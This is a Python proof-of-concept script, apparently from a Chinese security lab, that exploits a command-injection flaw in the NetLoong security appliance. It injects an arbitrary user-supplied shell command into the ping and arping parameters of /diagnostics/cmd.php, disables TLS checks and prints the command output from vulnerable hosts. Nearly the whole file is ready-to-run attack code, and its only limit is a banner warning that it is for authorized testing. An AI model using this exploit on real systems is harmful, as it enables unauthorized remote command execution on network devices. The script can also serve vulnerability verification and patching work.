import sys
import requests
import getopt
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exec(target,command):
    poc = [
        "/diagnostics/cmd.php?action=ping&count=||" + command + "||",
        "/diagnostics/cmd.php?action=arping&ifName=|" + command + "||"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    subnum = 0
    for i in poc:
        url = target + i
        try:
            r = requests.get(url,headers=headers,verify=False,timeout=10,proxies=proxies)
            if r.status_code == 200:
                print("[+] %s 存在漏洞,命令执行结果为:%s" % (url,r.text.strip("\n")))
            else:
                subnum += 1
                if subnum == 2:
                    print("[-] %s 不存在漏洞" % target)
        except Exception as e:
            print(e)
            # print("[-] %s 不存在漏洞" % target)

def usage():
    print("")
    print("NetLoong Arbitrary command execution / 博华网龙信息安全一体机任意命令执行")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

def main():
    global proxies
    proxies = None
    usage()
    if not len(sys.argv[1:]):
        sys.exit(0)

    try:
        opts,args = getopt.getopt(sys.argv[1:],"c:u:p",["command","url","proxy"])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(0)

    for o,a in opts:
        if o in ("-u","--url"):
            url = a
        elif o in ("-c","--command"):
            cmd = a
        elif o in ("-p","--proxy"):
            proxies = {
                "http": "127.0.0.1:8080",
                "https": "127.0.0.1:8080"
            }

    exec(url,cmd)

main()